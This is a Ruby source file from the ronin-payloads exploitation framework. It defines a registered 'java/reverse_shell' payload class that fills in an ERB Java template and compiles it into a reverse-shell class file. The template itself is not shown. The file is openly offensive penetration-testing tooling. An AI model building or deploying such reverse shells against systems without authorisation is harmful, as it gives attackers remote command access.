# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2023 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/java_payload'
require 'ronin/payloads/mixins/reverse_shell'
require 'ronin/payloads/mixins/build_dir'
require 'ronin/payloads/mixins/erb'

require 'tmpdir'

module Ronin
  module Payloads
    module Java
      #
      # A basic Java reverse shell.
      #
      class ReverseShell < JavaPayload

        include Mixins::ReverseShell
        include Mixins::BuildDir
        include Mixins::ERB

        register 'java/reverse_shell'

        description <<~DESC
          A basic Java reverse shell.
        DESC

        # Path to the `Payload.java.erb` ERB template file.
        TEMPLATE = File.join(__dir__,'reverse_shell','Payload.java.erb')

        # The path to the generated `.java` file.
        #
        # @return [String, nil]
        attr_reader :java_file

        # The path to the generated `.class` file.
        #
        # @return [String, nil]
        attr_reader :class_file

        #
        # Builds the Java reverse shell payload.
        #
        def build
          @java_file  = File.join(build_dir,'Payload.java')
          @class_file = File.join(build_dir,'Payload.class')

          File.write(@java_file,erb(TEMPLATE))
          compile(@java_file, dest_dir: build_dir)

          @payload = File.binread(@class_file)
        end

      end
    end
  end
end
